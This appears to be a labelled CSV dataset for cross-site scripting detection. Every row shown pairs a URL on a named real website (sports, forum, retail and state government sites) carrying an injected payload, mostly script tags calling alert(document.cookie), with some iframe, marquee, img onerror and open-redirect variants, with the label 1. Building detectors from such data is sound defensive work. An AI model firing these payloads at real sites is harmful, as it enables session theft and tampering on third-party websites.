Sentence,Label
http://losangeles.dodgers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script<br>&gt;,1
http://milwaukee.brewers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,1
http://newyork.mets.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,1
http://philadelphia.phillies.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scr<br>ipt&gt;,1
http://pittsburgh.pirates.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script<br>&gt;,1
http://stlouis.cardinals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,1
http://sandiego.padres.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,1
http://sanfrancisco.giants.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scrip<br>t&gt;,1
http://washington.nationals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;,1
http://www.playlist.com/websearch?searchfor='&gt;&lt;marquee&gt;testicles was here&lt;/marquee&gt;&amp;search=search,1
http://www.webmaster-talk.com/php-forum/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.rhinotalk.net/forums/member-introductions/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,1
http://www.buy-host.com/forums/news-updates/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scr<br>ipt&gt;,1
http://www.gamerzneeds.net/forums/news/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.healthline.com/search?q1=%27%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%27%3balert<br>(string.fromcharcode(88%2c83%2c83))%2f%2f%22%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%22%3b<br>alert(string.fromcharcode(88%2c83%2c83))%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert(stri<br>ng.fromcharcode(88%2c83%2c83))%3c%2fscript%3e,1
http://www.se7ensins.com/forums/xbox-360-discussion/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cooki<br>e);&lt;/script&gt;,1
http://www.layeredgfx.com/forums/tag-signature-tutorials/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.<br>cookie);&lt;/script&gt;,1
http://www.puremarketprofits.com/f233/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee&gt;,1
http://www.pc101.com/forum/f32/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://search.lifespan.org/search?p=q&amp;ts=custom&amp;s_2=1&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0,1
http://www.shortnews.com/feedback.cfm?fanz=1&amp;fbid=408632&amp;rubrik=testicles&quot;&gt;&lt;script&gt;alert(document.co<br>okie);&lt;/script&gt;&amp;start=1,1
http://www.enjoycg.com/forums/general/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://storage.organizeit.com/search?p=q&amp;ts=custom&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;restricted=mt_restricted_organizesit,1
http://search.folica.com/search?p=q&amp;ts=custom&amp;isort=score&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;x=0&amp;y=0,1
http://qantas.resultspage.com.au/search?p=q&amp;ts=custom&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0,1
http://search.dse.com.au/search?sessionid=4859ae4304748b06273fc0a87f9c06c8&amp;w=%22%3e%3cscript%3ealert<br>(document.cookie);%3c/script%3e&amp;submit.x=0&amp;submit.y=0&amp;submit=go,1
http://ccc.resultspage.com/search?s_2=1&amp;s_3=1&amp;ts=custom&amp;p=q&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;<br>y=0,1
http://search.cableorganizer.com/search?w=%3c/script%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e%3cscript%3e//%20&amp;view=list&amp;prodsearch.x=0&amp;prodsearch.y=0&amp;prodsearch=go,1
http://search.ulta.com/search?userid=guest&amp;w=%22%3e%3cscript%3ealert(%2fhacker+safe+my+ass%2f)%3b%3c<br>%2fscript%3e&amp;x=0&amp;y=0,1
http://replay.tickets.com/buy/myticketsservlet?orgid=testicles&quot;&gt;&lt;script&gt;alert(document.cokie);&lt;/scri<br>pt&gt;,1
http://aquaticeco.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,1
http://americanbridal.resultspage.com/search?ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,1
http://www.miglioman.altervista.org/prova/index.php?site=forum_topic&amp;topic=1&amp;type=asc&amp;page=%22%3e%3c<br>/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e%3c!--,1
http://siam99.servepics.com/webpic/list.php?id=1&amp;page=1&amp;pic=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,1
http://forums.wingchun.com.au/academy/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee&gt;,1
http://www.cashloopholes.co.uk/gambling-loopholes-secrets/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/mar<br>quee&gt;,1
http://www.cableforum.co.uk/board/10/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.politikstube.de/forum/vorstellungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,1
http://www.dhforo.com/bienvenidas/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.developer-network.org/suggestions-feedback/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,1
http://www.esportboard.de/forum/ankuendigungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,1
http://www.exasco.info/forum/depression/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.dieselhaulin.com/forums/introduce-yourself/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee<br>&gt;,1
http://www.caraudiojunkyard.com/forum/car-audio-junkyard/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;,1
http://www.blutschwerter.de/f17-b-news/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.gimnasio.ws/general/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.mymodeltalk.com/jobs/modeling-acting-auditions-new-york-new-jersey/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;sc<br>ript&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.shellcash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.owensclickplace.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,1
http://thedragonsgold.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.thetwodivasgpt.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.girlsbazaar.com/members/login.php?path=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://cashtroops.com/members/login.php?path=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.hitmanslife.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.decayofcamelot.com/register.php?ref=%27%3e%3ciframe+src=http://google.com%3e,1
http://www.troubledstreets.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.mystablemates.co.uk/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.leprechaunsloot.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,1
http://www.mafiachaos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.gptoffers.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://milkywayclicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.colossal-cash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://viva-ponata.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.intoffers.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e,1
http://www.riseofterror.com/register.php?ref=&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://pocketchangegpt.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.race4clicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.grandtheftmastermind.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.piratequests.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.starreferrals.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.hostile-city.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.squishycash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.jillsclickcorner.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,1
http://ozgonewild.com/register.php?ref=%27%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://firehouseoffers.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://firehouseoffers.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/scrip<br>t%3e,1
http://piratesriches.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e,1
http://www.mafia3000.com/register.php?ref=%27%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://www.bowlingforcash.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/sc<br>ript%3e,1
http://www.gptcashcow.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e,1
http://www.dazzleindough.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e,1
http://www.myepisodes.com/login.php?u=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://ready-up.com/main/community/f6/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;pappy_was_here&lt;/marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3e,1
http://www.stop-sign.com/se/se332b.php?pg=%22%3e%3c/a%3etesticles&amp;ver=%22%3e%3c/a%3etesticles&amp;n=%22%<br>3e%3c/a%3etesticles&amp;uid=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e&amp;bit_mask=0&amp;bi<br>t_sample=780508868&amp;sv=mss_spin_mss_spin,1
http://freebiesjunction.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://investors.cray.com/phoenix.zhtml?c=98390&amp;p=irol-newsarticle&amp;id=1136684&amp;highlight=%22%3etestic<br>les%3c/a%3etest%3cmarquee%3epappy was here%3c/marquee%3e,1
http://www.kinkom.by/search.php?cat=&amp;query=%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://dailytimesuck.com/search.php?search=%22%3e%3ciframe+src=http://google.com?&amp;searchelement=both,1
http://www.themotorhouse.co.uk/register/?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://bankrollbucks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.thedjlist.com/login.php?scen=a%3a1%3a{i%3a0%3bi%3a75%3b}&amp;ref='&gt;&lt;script&gt;alert(document.coo<br>kie);&lt;/script&gt;,1
http://www.gulftalent.com/home/canpositions-viewlist-s.php?currentpage=3&amp;recordsperpage=25&amp;name_flag<br>=&amp;from_search=true&amp;jobcat=&amp;industry=22&amp;seniority=&amp;frmpositioncountry=&amp;pastdate=&amp;from_possearch=&amp;pos_<br>ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.wehire.ca/personal.php?action=new&amp;auth_sess=e757d8719f17c4c88c41344fc1107ef6&amp;ref=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.jobgeo.com/personal.php?action=new&amp;auth_sess=&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;,1
http://r.espn.go.com/espn/preferences/passivelogin?appredirect=http://google.com,1
http://www.commonsensemedia.org/user/register.php?fwd=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.seven-bux.com/index.php?view=login&amp;ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.jtpappys.com/products.php?cat=7%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,1
http://www.mycricket.com/cricketsupport/faqs/details?id=529&amp;fromsearch=%22%3e%3c/a%3e%3cscript%3eale<br>rt(/hacker%20safe%20my%20ass/);%3c/script%3e,1
http://www.4x4mecca.com/forum/tech-tuesdays/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;,1
http://www.directory.wiredawg.net/index.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://visitlasvegas.com/vegas/my-vegas/login.jsp?email=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www2.fuse.tv/login.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www2.fuse.tv/search.php?searchstring=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=0&amp;y=0,1
http://usa.kaspersky.com/trials/trialsreg.php?aw=trials+page&amp;ref=&quot;&gt;&lt;script&gt;alert(&quot;so anti-virus cant<br>secure their pages?&quot;);&lt;/script&gt;&amp;chapter=146538207,1
http://www.cash2grab.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.globalcashclicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.eetimes.com/techsearch/not_found.jhtml;jsessionid=fpyiswcussjkqqsndlpckh0cjunn2jvn?nftype<br>=empty&amp;querytext=%22%3b+alert%28document.cookie%29%3b%2f%2f&amp;site_id=ee+times&amp;_requestid=212632,1
http://www.5centminimum.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.ticketcenter.com/sendpage/friend.php?id=&quot;&gt;&lt;marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3esome concert tickets&lt;/marquee&gt;,1
http://www.hexar.net/viewfile.php?/&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.mlgpro.com/?q=node/219283&amp;page=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;query=node/<br>219283,1
http://wow.maxvellnos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.wiredawg.net/mail.asp?source=locator&amp;personid=2757&amp;name=&lt;script&gt;alert(document.cookie);&lt;/<br>script&gt;,1
http://www.localschooldirectory.com/include/information/az/category_2/aims_chart.php?district_page=y<br>&amp;state_page=y&amp;subject=&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;grade=grade,1
http://api.msappspace.com/proxy/relay.proxy?opensocial_authtype=signed&amp;opensocial_token=at4ijkeddpnl<br>kau5f/gsmgfqlodup0edptea45xouklxsvujcvgcams+blrbo8m3617chfi29vffwitjqsbfr3rlryrivuzjlk2v2b+fcua=&amp;ope<br>nsocial_url=http://xssed.com,1
http://www.centralchat.net/chatrooms/cgiirc.php?c=&lt;/title&gt;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.totalbeauty.com/index.php?swords=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=0&amp;y=0&amp;id=51<br>&amp;no_cache=1,1
http://hotlists.hotornot.com/style-g961172-heroes.html?rid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,1
http://hotlists.hotornot.com/?state=embed&amp;wid=nlosgzel&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;aut<br>htoken=undefined&amp;username=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://hotlists.hotornot.com/?state=browse&amp;tag=boobs&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.universalcriminal.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;,1
http://www.warriorsreign.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.torn-county.net/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.haunted-horrors.com/register2.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.downtown-to.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.video-game-rpg.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://suburban-assault.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;,1
http://www.daysofprohibition.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.brokencriminals.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://trapped-in-paradise.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.criminaldevastation.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://corruptedcity.net/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.bogansandbitches.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.unholystate.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.pimpstreetwars.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://la-familia.nl/register.php?ref=&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.ultimateoutdoorz.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://wanted-criminals.net/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://scoreboards.hotornot.com/?groupname=&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
https://www.earthlyendeavours.com/signup.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.tropicalterror.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.rapid-city.blackheartworks.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;,1
http://www.starfleetz.com/login.php?case=register&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://www.stompville.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;,1
http://www.gangengagement.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,1
http://content.sos.state.ga.us/cdm4/results.php?cisoop1=all&amp;cisofield1=cisosearchall&amp;cisorestmp=resu<br>lts.php&amp;cisoviewtmp=item_viewer.php&amp;cisomode=grid&amp;cisogrid=thumbnail%2ca%2c1%3btitle%2ca%2c1%3brelat<br>i%2ca%2c0%3bdate%2c200%2c0%3bnone%2ca%2c0%3b20%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cisobib=title%2<br>ca%2c1%2cn%3brelati%2ca%2c0%2cn%3bdate%2c200%2c0%2cn%3bnone%2ca%2c0%2cn%3bnone%2ca%2c0%2cn%3b20%3bti<br>tle%2crelati%2cdate%2cnone%2cnone&amp;cisothumb=20+%284x5%29%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cisot<br>itle=20%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cisohiera=20%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cis<br>osuppress=1&amp;cisobox1=%3cscript%3ealert%281%29%3b%3c%2fscript%3e&amp;cisoroot=all,1
http://www.dmva.state.co.us/search.php?search=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,1
http://zazachat.zazasoftware.com/livechatclient/livechatvisitor.aspx?zzwindow=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie);&lt;/script&gt;&amp;zazac=8007,1
http://catalyst.ogb.state.ms.us/search.php?form_props%5bcounty%5d=&amp;form_props%5bfield%5d=&amp;form_props<br>%5btownship%5d=&amp;form_props%5bsection%5d=&amp;form_props%5brange%5d=&amp;form_props%5boperator%5d=&amp;form_props<br>%5bapi%5d=%3cscript%3ealert%281%29%3b%3c%2fscript%3e&amp;form_props%5bform_type%5d=&amp;mode=2&amp;start=0,1
"http://digitum.washingtonhistory.org/cdm4/results.php?cisoop1=all&amp;cisobox1=%3cimg%20src%3d%22%22%20o<br>nerror%3d%22alert(1)%3b%22%3e&amp;cisofield1=cisosearchall&amp;cisoop2=exact&amp;cisobox2=&amp;cisofield2=cisosearch<br>all&amp;cisoop3=any&amp;cisobox3=&amp;cisofield3=cisosearchall&amp;cisoop4=none&amp;cisobox4=&amp;cisofield4=cisosearchall&amp;c<br>isoroot=all,/curtis,/genphotos,/art,/basket,/manuscripts,/indian,/columbia,/stevens,/lcexpedition,/s<br>ohon,/maps,/ephemera,/artifacts,/archaeology,/boland,/wehn,/music,/womens&amp;t=a",1
